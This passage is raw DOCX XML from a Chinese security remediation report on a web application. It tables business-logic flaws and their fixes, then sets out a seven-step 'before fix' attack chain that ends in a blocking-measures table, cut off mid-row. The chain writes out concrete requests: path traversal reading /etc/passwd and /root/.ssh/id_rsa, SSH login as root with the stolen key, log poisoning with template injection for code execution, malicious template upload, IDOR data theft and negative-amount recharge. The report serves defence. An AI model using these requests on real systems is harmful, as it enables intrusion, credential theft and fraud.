        <w:t>POST /recharge</w:t>
        <w:br/>
        <w:t>Body: user_id=1&amp;amount=-99999  -&gt; admin 余额清零</w:t>
        <w:br/>
        <w:t>Body: user_id=3&amp;amount=99999   -&gt; 给自己账户充值</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>安全危害</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 批量用户隐私泄露</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：手机号、邮箱、余额全量暴露，可被社工利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 虚拟资产损失</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：余额可被随意篡改，充值和扣款功能被完全滥用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>• 资金数据不可信</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：系统账目混乱，余额可信度归零</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="444444"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>该漏洞集合已在《个人中心与充值模块·业务逻辑漏洞修复报告》中全面修复，本次不再重复展开。要点如下：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>修复措施</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>IDOR 水平越权</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>增加 user_id 归属校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>充值金额无正数校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>amount ≤ 0 时拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>充值金额无上限</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>MAX_AMOUNT = 100000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>敏感信息未脱敏</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>手机号/邮箱脱敏输出</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>未登录可访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>增加 session 校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>三、完整入侵攻击链（修复前 vs 修复后）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>修复前（7 步接管服务器）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>┌──────────────────────────────────────────────────────────┐</w:t>
        <w:br/>
        <w:t>│          修复前：从匿名访问到服务器完全沦陷（5 分钟）        │</w:t>
        <w:br/>
        <w:t>├──────────────────────────────────────────────────────────┤</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第1步 ─ 侦察踩点                                          │</w:t>
        <w:br/>
        <w:t>│  扫描发现 /page?name=../../etc/passwd 存在 LFI             │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第2步 ─ 敏感文件窃取                                      │</w:t>
        <w:br/>
        <w:t>│  GET /page?name=../../root/.ssh/id_rsa                    │</w:t>
        <w:br/>
        <w:t>│  → 下载 SSH 私钥                                           │</w:t>
        <w:br/>
        <w:t>│  GET /page?name=../../app.py                              │</w:t>
        <w:br/>
        <w:t>│  → 获取完整源码和密钥                                       │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第3步 ─ 服务器提权接管                                    │</w:t>
        <w:br/>
        <w:t>│  chmod 600 id_rsa &amp;&amp; ssh -i id_rsa root@target            │</w:t>
        <w:br/>
        <w:t>│  → 获得 root shell                                         │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第4步 ─ 后门植入 + 持久化                                  │</w:t>
        <w:br/>
        <w:t>│  日志投毒: ssh "{{SSTI}}"@target 写入 auth.log            │</w:t>
        <w:br/>
        <w:t>│  LFI 包含: GET /page?name=../../var/log/auth.log → RCE    │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第5步 ─ 上传恶意文件                                      │</w:t>
        <w:br/>
        <w:t>│  POST /upload (filename=../../templates/evil.html)        │</w:t>
        <w:br/>
        <w:t>│  → 覆盖模板 → SSTI → RCE                                   │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第6步 ─ 横向数据窃取                                      │</w:t>
        <w:br/>
        <w:t>│  GET /profile?user_id=1    (IDOR 越权)                     │</w:t>
        <w:br/>
        <w:t>│  → 批量获取用户手机号、邮箱、余额                            │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>│  第7步 ─ 资金篡改 + 内网渗透                                │</w:t>
        <w:br/>
        <w:t>│  POST /recharge user_id=1&amp;amount=-99999                    │</w:t>
        <w:br/>
        <w:t>│  → 清空管理员余额                                           │</w:t>
        <w:br/>
        <w:t>│  SSH 隧道建立 → 攻击内网其他主机                            │</w:t>
        <w:br/>
        <w:t>│                                                            │</w:t>
        <w:br/>
        <w:t>└──────────────────────────────────────────────────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>修复后（全部阻断）</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>攻击步骤</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞依赖</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>阻断点</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>阻断措施</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>① LFI 扫描</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">白名单：仅 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>help/about/faq</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>，其余返回 404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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完全阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>② 读取 SSH 私钥</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 1 → 漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单阻断目录穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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完全阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>③ SSH 登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>私钥不可读取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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完全阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>④ 日志投毒 + RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>白名单 + bleach 清洗</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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完全阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>⑤ 上传恶意文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞 8/9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UUID 重命名 + Magic Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>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完全阻断</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>⑥ 越权数据窃取</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
